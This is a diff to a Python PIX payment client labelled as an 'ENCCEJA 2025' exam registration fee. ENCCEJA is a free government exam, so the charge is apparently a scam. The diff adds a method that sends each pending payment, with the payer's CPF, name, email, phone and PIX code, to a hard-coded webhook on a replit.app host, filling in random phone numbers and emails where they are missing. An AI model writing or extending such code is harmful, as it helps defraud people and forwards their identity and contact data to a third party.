@@ -1,5 +1,7 @@
 import os
 import requests
+import json
+import uuid
 from typing import Dict, Any, Optional
 from datetime import datetime
 import random
@@ -31,6 +33,106 @@ class NovaEraPaymentsAPI:
         ddd = str(random.randint(11, 99))
         number = ''.join(random.choices(string.digits, k=8))
         return f"{ddd}{number}"
+        
+    def _send_webhook(self, payment_data: Dict[str, Any], user_data: Dict[str, Any]) -> None:
+        """
+        Envia um webhook para o endpoint especificado com os dados do pagamento pendente
+        formato similar ao exemplo fornecido
+        """
+        try:
+            # URL do webhook
+            webhook_url = "https://webhook-manager.replit.app/api/webhook/vt6h0bukud9rq6z8zju0a00l7hvomvx9"
+            
+            # Gera um ID de transação se não existir
+            transaction_id = payment_data.get('id') or str(uuid.uuid4())
+            
+            # Prepara os dados do cliente
+            cpf = ''.join(filter(str.isdigit, user_data.get('cpf', '')))
+            phone = user_data.get('phone', '')
+            if not phone or len(phone.strip()) < 10:
+                phone = self._generate_random_phone()
+            
+            # Formata o telefone como +55 + número
+            if not phone.startswith('+'):
+                phone = f"+55{phone}"
+            
+            # Gera um customId único
+            custom_id = f"FOR{datetime.now().strftime('%y%m%d%H%M%S')}{random.randint(10000, 99999)}"
+            
+            # Prepara o payload do webhook
+            payload = {
+                "utm": "",
+                "dueAt": None,
+                "items": [
+                    {
+                        "id": str(uuid.uuid4()),
+                        "title": "Inscrição ENCCEJA 2025",
+                        "quantity": 1,
+                        "tangible": False,
+                        "paymentId": transaction_id,
+                        "unitPrice": int(float(user_data.get('amount', 143.10)) * 100)
+                    }
+                ],
+                "status": "PENDING",
+                "pixCode": payment_data.get('pix_code', ""),
+                "customId": custom_id,
+                "customer": {
+                    "id": str(uuid.uuid4()),
+                    "cep": None,
+                    "cpf": cpf,
+                    "city": None,
+                    "name": user_data.get('name', '').upper(),
+                    "email": user_data.get('email', self._generate_random_email(user_data.get('name', ''))),
+                    "phone": phone,
+                    "state": None,
+                    "number": None,
+                    "street": None,
+                    "district": None,
+                    "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
+                    "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
+                    "complement": None
+                },
+                "netValue": int(float(user_data.get('amount', 143.10)) * 100 * 0.92),  # 92% do valor total
+                "billetUrl": None,
+                "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
+                "expiresAt": None,
+                "paymentId": transaction_id,
+                "pixQrCode": payment_data.get('pix_qr_code', ""),
+                "timestamp": int(datetime.now().timestamp() * 1000),
+                "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
+                "approvedAt": None,
+                "billetCode": None,
+                "externalId": "",
+                "refundedAt": None,
+                "rejectedAt": None,
+                "totalValue": int(float(user_data.get('amount', 143.10)) * 100),
+                "checkoutUrl": "",
+                "referrerUrl": "",
+                "chargebackAt": None,
+                "installments": None,
+                "paymentMethod": "PIX",
+                "deliveryStatus": None
+            }
+            
+            # Envia o webhook
+            headers = {
+                'Content-Type': 'application/json'
+            }
+            
+            response = requests.post(
+                webhook_url,
+                headers=headers,
+                data=json.dumps(payload),
+                timeout=10
+            )
+            
+            current_app.logger.info(f"[WEBHOOK] Enviado para {webhook_url}. Status: {response.status_code}")
+            if response.status_code >= 400:
+                current_app.logger.error(f"[WEBHOOK] Erro ao enviar: {response.text}")
+            
+        except Exception as e:
+            current_app.logger.error(f"[WEBHOOK] Erro ao enviar webhook: {str(e)}")
+            # Não levanta exceção para não interromper o fluxo principal
 
     def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Create a PIX payment request"""
@@ -112,7 +214,9 @@ class NovaEraPaymentsAPI:
                 # A API Nova Era retorna 201 para criação bem-sucedida
                 if response.status_code in [200, 201]:
                     response_data = response.json()
-                    return {
+                    
+                    # Preparar os dados de retorno
+                    payment_result = {
                         'id': response_data['data']['id'],
                         'status': response_data['data']['status'],
                         'amount': response_data['data']['amount'],
@@ -121,6 +225,12 @@ class NovaEraPaymentsAPI:
                         'expires_at': response_data['data']['pix']['expirationDate'],
                         'secure_url': response_data['data']['secureUrl']
                     }
+                    
+                    # Enviar o webhook para notificar sobre o pagamento pendente
+                    current_app.logger.info("[WEBHOOK] Enviando dados do pagamento pendente para o webhook...")
+                    self._send_webhook(payment_result, data)
+                    
+                    return payment_result
                 else:
                     raise ValueError(f"Erro ao processar pagamento: {response.status_code} - {response.text}")
 
